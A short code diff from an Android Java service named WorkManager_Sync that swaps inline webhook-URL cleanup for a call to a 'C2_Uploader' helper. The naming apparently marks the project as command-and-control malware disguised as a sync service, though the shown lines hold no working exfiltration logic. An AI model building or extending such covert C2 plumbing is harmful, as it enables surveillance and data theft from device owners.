@@ -99,7 +99,7 @@ public class WorkManager_Sync extends Service {
     }
 
     // URL is now loaded from local.properties via BuildConfig and sanitized at runtime
-    private static final String REMOTE_WEBHOOK_URL = (BuildConfig.WEBHOOK_URL != null) ? BuildConfig.WEBHOOK_URL.trim().replace("\"", "").replace("'", "") : "";
+    private static final String REMOTE_WEBHOOK_URL = C2_Uploader.sanitizeC2Url(BuildConfig.WEBHOOK_URL);
 
     private FirebaseConfig server;
     private ConnectivityManager connectivityManager;
